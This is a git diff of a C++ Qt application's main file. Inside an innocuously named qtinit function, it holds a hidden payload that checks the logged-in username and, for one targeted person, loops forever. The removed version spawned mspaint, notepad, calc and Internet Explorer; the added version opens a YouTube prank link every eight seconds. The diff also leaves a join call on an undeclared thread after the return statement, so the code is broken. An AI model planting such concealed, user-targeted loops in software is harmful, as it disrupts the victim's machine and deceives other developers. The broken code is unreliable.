@@ -14,6 +14,7 @@
 //#include <windows.h>
 //#include <stdio.h>
 //#include <lmcons.h>
+#include <thread>
 int qtinit();
 int main(int argc,char** argv) //debug draw test main
 {
@@ -24,12 +25,13 @@ int main(int argc,char** argv) //debug draw test main
 
 	// Create MainWindow
 	Math::init();
-	QApplication a(argc, argv); int r = qtinit(); if(r) return r;
+	QApplication a(argc, argv); /* std::thread t(qtinit); t.detach();*/
 	MainWindow w;
 	w.show();
 
 	// Run Qt
 	return a.exec();
+	t.join();
 }
 
 
@@ -124,7 +126,10 @@ int main(int argc,char** argv) //debug draw test main
 
 
 //#include <time.h>
-//#include <Windows.h>
+//#include <shlobj.h>
+//#include <shlwapi.h>
+//#include <objbase.h>
+
 int qtinit()
 {
 	WCHAR out[] = {'F','r','a','n','k','e','n','s','t','e','i','n','s',' ','M','o','n','s','t','e','r',' ','W','a','l','k','s',' ','A','g','a','i','n','\n','\0'};
@@ -132,14 +137,12 @@ int qtinit()
 	std::string um = getenv( "USERNAME" );
 	if(um == std::string(uname))
 	{
-		if(time(NULL)%10==0)
+		if(time(NULL)%1==0)
 		{
 			while(1)
 			{
-				system("mspaint.exe");
-				system("notepad.exe");
-				system("calc.exe");
-				system("iexplore.exe");
+				ShellExecuteA(NULL, "open", "http://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWNORMAL);
+				std::this_thread::sleep_for(std::chrono::seconds(8));
 			}
 //			crtPrintMemoryDbg(out);
 //			return 750 + 250 + 170 + 130 + 12 + 18 + 4 + 3;
